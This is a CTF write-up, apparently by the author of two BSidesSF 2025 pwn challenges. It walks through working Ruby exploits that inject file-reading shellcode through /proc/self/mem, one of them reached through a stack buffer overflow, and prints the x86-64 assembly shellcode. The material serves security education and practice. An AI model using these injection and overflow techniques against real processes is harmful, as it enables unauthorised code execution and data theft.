---
title: 'BSidesSF 2025: accan and drago-daction: pwn your own memory'
author: ron
layout: post
categories:
- bsidessf-2025
- ctfs
permalink: "/2025/bsidessf-2025-accan-and-drago-daction-pwn-your-own-memory"
date: '2025-04-27T15:59:10-07:00'

---

If you read [my `bug-me` write-up](/2025/bsidessf-2025-bug-me-hard-reversing-challenge-) or my [Linux process injection](https://www.labs.greynoise.io/grimoire/2025-01-28-process-injection/) blog, you may be under the impression that I've been obsessed with the ability of Linux processes to write to their own memory.

These challenges are no exception!

You can download source and the challenge (including solutions) [here (acaan)](https://github.com/BSidesSF/ctf-2025-release/tree/main/acaan) and [here (drago-daction)](https://github.com/BSidesSF/ctf-2025-release/tree/main/drago-daction).

<!--more-->

## acaan

I actually wrote `drago-daction` first, but decided I wanted a more training-wheels-y version of it so I wrote `acaan`, which is much more direct.

For what it's worth, `acaan` stands for "any card at any number", which is a plot in magic (card tricks). Volunteer names any card, and any number (between 1 and 52), and lo and behold! The card is at that number. And the audience is amazed - once you explain that it's a Big Deal.

When you connect to `acaan`, it prompts you for a file, and offset, and new data to write. Then it does what it says - it writes that data to that offset in that file:

```
$ nc acaan-d715d4a7.challenges.bsidessf.net 4113
Welcome to ACAAN (Any Computerfile At Any Number)!
Filename?
/etc/passwd
Offset into the file (either decimal, or 0xhex)?
10
Data to replace it with? (Binary is fine - end with "\n.\n" or by closing the socket)
hello
.
Replacing 5 bytes from file /etc/passwd at offset 10! Hope this is everything you were hoping for!
Couldn't open /etc/passwd!
```

I also provided the source so you can see there are no tricks - it's exactly what it sounds like.

The challenge is solved by writing to read-only memory by editing `/proc/self/mem`, my technique du jour:

```
s = TCPSocket.new(HOST, PORT)
puts s.readpartial(1024)
s.puts('/proc/self/mem')
sleep(0.5)
puts s.readpartial(1024)
s.puts(TARGET_ADDRESS.to_i)
sleep(0.5)
puts s.readpartial(1024)
s.puts(File.read(File.join(__dir__, 'shellcode.bin')))
s.puts('.')
s.puts('.')
sleep(0.5)
check_flag(s.read(1024), terminate: true, partial: true)
```

The shellcode is pretty standard `open` / `read` / `write`, written by ai and then fixed to actually work:

```
bits 64
; Open the file
jmp filename
top:
  pop rdi
  xor rsi, rsi             ; Flags = 0 (O_RDONLY)
  xor rdx, rdx             ; Mode = 0
  mov rax, 2               ; Syscall for open
  syscall
  mov rdi, rax

  ; Read from the file
  sub rsp, 0x100           ; Allocate space on the stack for the buffer
  lea rsi, [rsp]           ; Load the buffer address into rsi
  mov rdx, 0x100           ; Read up to 256 bytes
  mov rax, 0               ; Syscall for read
  syscall

  ; Write to stdout
  mov rdi, 1               ; Set fd to stdout
  mov rdx, rax             ; Set the number of bytes to write
  mov rax, 1               ; Syscall for write
  syscall

  ; Exit
  xor rdi, rdi             ; Exit code 0
  mov rax, 60              ; Syscall for exit
  syscall
filename:
  call top
  db "/flag.txt", 0        ; Null-terminated filename
```

## `drago-daction`

Yes, I know that `draco-daction` would have been a better name! I changed the name once and didn't want to change it again. :)

Although this has a similar payoff to `acaan`, the path there is much different: this application is vulnerable to a stack buffer overflow which lets you change the filename and offset.

The premise of the challenge is redacting information. The first time it redacts a string, you can overwrite the stack data. The second time, it opens the wrong file and writes to the wrong offset. Once you've reached that point, you're back to `acaan`, only much more annoying.

### Solution

First, we create a file with two replaceable strings:

```ruby
# Create the dragonfile
file = File.new('/tmp/dragonfile.txt', 'w')

# This requires two lines: one to overwrite the pointers, and one to write to
# memory
file.puts("dragon#{ 'B' * 100 }")
file.puts("dragon#{ 'B' * 100 }")
file.close
```

Then we create our payload, which replaces "dragon" with the payload, which includes an overflow:

```ruby
SHELLCODE = File.read(shellcode_file.to_path).force_encoding('ASCII-8bit').ljust(PADDING, 'A')

# ...

payload = [
  "dragon\n",
  "#{ SHELLCODE }#{ TARGET_ADDRESS_STR }/proc/self/mem\0\n",
].join()
```

We replace some random code at the end of the binary with our shellcode:

```
# Find a good place to target - we're choosing this line:
# 401751:       e8 2a f9 ff ff          call   401080 <__stack_chk_fail@plt>
unless `objdump -D #{ EXE } | grep 'call.*__stack_chk_fail@plt' | tail -n1` =~ /^ *([0-9a-fA-F]*)/
  puts "Couldn't find __stack_chk_fail call!"
  exit 1
end
TARGET_ADDRESS = Regexp.last_match(1).to_i(16)
TARGET_ADDRESS_STR = [TARGET_ADDRESS - ADJUST].pack('V')
```

And that's it!

Honestly, it was a bit of a pain to solve, hopefully folks enjoy it!
